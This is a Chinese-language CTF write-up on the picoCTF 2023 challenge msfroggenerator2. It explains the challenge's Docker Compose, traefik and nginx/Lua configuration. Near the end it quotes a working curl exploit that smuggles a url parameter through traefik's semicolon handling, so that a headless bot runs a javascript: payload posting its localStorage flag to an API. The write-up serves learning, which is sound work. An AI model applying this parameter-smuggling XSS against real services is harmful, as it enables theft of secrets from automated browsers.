# msfroggenerator2

[题目](https://play.picoctf.org/practice/challenge/360)

照着[wp](https://rorical.blue/2023/03/picoCTF%202023%20msfroggenerator2%20writeup/)复现都复现不出来，我是废物。这道题让我再次深刻地意识到我的web基础过于薄弱。大家做不出来这道题是因为想不到payload，我做不出来这道题是因为题没看懂。这里只记录基础内容的补充。

首先是docker-compose.yml。以前从来没认真看过这个文件，一度以为用处不大。我tm是怎么走到今天的？

```yml
services:
  api:
    container_name: api
    build: ./api
    init: true
    volumes:
      - ./flag.txt:/flag.txt
  bot:
    container_name: bot
    build: ./bot
    init: true
    volumes:
      - ./flag.txt:/flag.txt
  traefik:
    image: traefik:2.9
    container_name: traefik
    volumes:
      - ./traefik/traefik.yml:/etc/traefik/traefik.yml:ro
      - ./traefik/web.yml:/etc/traefik/web.yml:ro
  openresty:
    container_name: openresty
    image: openresty/openresty:1.21.4.1-0-alpine
    ports:
      - 8080:8080
    volumes:
      - ./openresty/web.conf:/etc/nginx/conf.d/web.conf:ro
      - ./openresty/static:/var/www:ro
```

大部分都可以看[文档](https://docs.docker.com/compose/compose-file/compose-file-v3/)。该文件指明有4个服务：api，bot，traefik和openresty。这4个服务的名字都是用户自己取的，不重要。每个服务内的container_name同理。init似乎不重要，文档说作用是`Run an init inside the container that forwards signals and reaps processes. `，这道题里的作用不明显。[volumes](https://docs.docker.com/storage/volumes/)可用于保持数据，个人感觉在拷贝文件，把源代码里的文件拷贝到container里。image是container使用的镜像，build则是当场创建一个，利用指定文件夹内的Dockerfile。

里面提到的[traefik](https://doc.traefik.io/traefik/routing/overview/)是一个用于[反向代理](https://www.zhihu.com/question/24723688)和[负载均衡](https://zhuanlan.zhihu.com/p/32841479)的软件。那么它代理的是啥呢？

```yml
http:
  routers:
    api:
      service: api
      rule: "Host(`api`)"
    bot:
      service: bot
      rule: "Host(`bot`)"
  services:
    api:
      loadBalancer:
        servers:
          - url: "http://api:8080"
    bot:
      loadBalancer:
        servers:
          - url: "http://bot:8080"
```

这里我没有特别地去了解配置文件的写法，猜测是有两个路由，rule里根据host头判断要转发到哪个服务。用户主要访问的服务器肯定是openresty，因为只有它对外开放了port。那么来看看nginx的[配置文件](https://www.cnblogs.com/54chensongxia/p/12938929.html)。

```conf
server {
    listen 8080;
    resolver local=on;
    location / {
        add_header Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self'; img-src https://cdn.jsdelivr.net/gh/Crusaders-of-Rust/corCTF-2022-public-challenge-archive@master/web/msfroggenerator/task/img/; connect-src 'self'" always;
        root /var/www;
    }
    location /api/ {
        proxy_set_header Host api;
        proxy_pass "http://traefik:8080";
    }
    location = /report {
        proxy_set_header Host bot;
        set_by_lua $url 'return "http://openresty:8080/?id=" .. ngx.var.arg_id';
        proxy_pass "http://traefik:8080/?url=$url";
    }
}
```

[proxy_set_header](https://www.cnblogs.com/kevingrace/p/8269955.html)重新定义或添加字段传递给代理服务器的请求头，设置的正是刚才提到的host头。[proxy_pass](https://www.jianshu.com/p/b010c9302cd0)设置转发给traefik，然后traefik就能根据host头选择服务了。[set_by_lua](https://juejin.cn/s/nginx%20set_by_lua%20directive)用于在nginx配置文件中执行Lua代码，并将执行结果存储到nginx变量中。`..`起到拼接的作用，`ngx.var.arg_id`为query 参数。

这里就是全部的基础内容了，具体解法可以看wp，非常清晰（就是复现不出来，再清晰也改变不了我笨的事实）。

今天看到另一个[wp](https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#msfroggenerator2)，再度刷新我的认知：糟了原来这么简单，看来我真的是个笨蛋。

前半部分和上面的wp一样，利用traefik判断query string separator时会考虑分号`;`，且在 2.7.2 版本之后会将分号标准化为`&`，于是有了参数覆盖。非预期的地方在于，既然可以让bot去任意url了，完全可以塞个`javascript:script`来让bot执行xss payload。
```sh
base=
curl -g $base'/report?id=;url=javascript:fetch("/api/reports/add",{method:"POST",headers:{"Content-Type":"application/json","Authorization":`Bearer\u0020${localStorage.flag}`},body:JSON.stringify({url:localStorage.flag})})' -v
sleep 5
curl $base'/api/reports/get' | jq .[].url
```
最后的`jq .[].url`中的jq是个处理json的命令，`.[]` is a jq filter that extracts the values of all elements in the top-level array。

exp逻辑大概是这样的：根据源码（bot.js），bot会去到我们给出的url，在url的页面截个图，发往`/api/reports/add`。`/api/reports/add`判断Bearer是否是flag（即是不是bot发的），然后将接收到的req.body作为report加入reports数组（web.js）。`/api/reports/get`路由获取之前加的所有report。现在我们发送的url直接就是js代码，bot执行后会带着bearer去往add，req.body也是flag。自然去到get就能拿到flag了。

题目作者确实加了csp，但chrome似乎允许`page.goto`(等于用户在浏览器输入url)执行xss，不管csp。